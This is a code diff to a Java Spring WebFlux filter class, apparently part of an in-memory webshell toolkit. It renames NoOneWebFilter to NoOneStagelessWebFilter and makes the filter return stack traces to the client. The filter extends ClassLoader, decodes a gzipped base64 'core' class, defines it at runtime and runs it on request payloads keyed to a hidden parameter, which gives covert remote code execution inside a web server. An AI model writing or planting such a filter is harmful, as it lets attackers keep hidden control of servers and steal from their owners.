@@ -10,26 +10,24 @@ import org.springframework.web.server.WebFilterChain;
 import reactor.core.publisher.Mono;
 import reactor.core.scheduler.Schedulers;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.nio.charset.StandardCharsets;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
  */
-public class NoOneWebFilter extends ClassLoader implements WebFilter {
+public class NoOneStagelessWebFilter extends ClassLoader implements WebFilter {
     private static Class<?> coreClass = null;
     private static String coreGzipBase64;
     private static String paramName;
     private static int prefix;
     private static int suffix;
 
-    public NoOneWebFilter() {
+    public NoOneStagelessWebFilter() {
     }
 
-    public NoOneWebFilter(ClassLoader parent) {
+    public NoOneStagelessWebFilter(ClassLoader parent) {
         super(parent);
     }
 
@@ -45,8 +43,14 @@ public class NoOneWebFilter extends ClassLoader implements WebFilter {
                             .subscribeOn(Schedulers.boundedElastic()))
                     .flatMap(buffer -> response.writeWith(Mono.just(buffer)))
                     .onErrorResume(e -> {
-                        e.printStackTrace();
-                        return chain.filter(exchange);
+                        try {
+                            byte[] errorData = getStackTraceAsString(e).getBytes("UTF-8");
+                            wrapResponse(response);
+                            DataBuffer errorBuffer = response.bufferFactory().wrap(errorData);
+                            return response.writeWith(Mono.just(errorBuffer));
+                        } catch (Throwable ex) {
+                            return Mono.empty();
+                        }
                     });
         }
         return chain.filter(exchange);
@@ -101,7 +105,7 @@ public class NoOneWebFilter extends ClassLoader implements WebFilter {
     private DataBuffer executeCore(byte[] payload, ServerHttpResponse response) throws Exception {
         if (coreClass == null) {
             byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
-            coreClass = new NoOneWebFilter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
+            coreClass = new NoOneStagelessWebFilter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
         }
         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
         Object httpChannelCore = coreClass.newInstance();
@@ -142,5 +146,12 @@ public class NoOneWebFilter extends ClassLoader implements WebFilter {
             }
             out.close();
         }
+    }
+
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
     }
 }
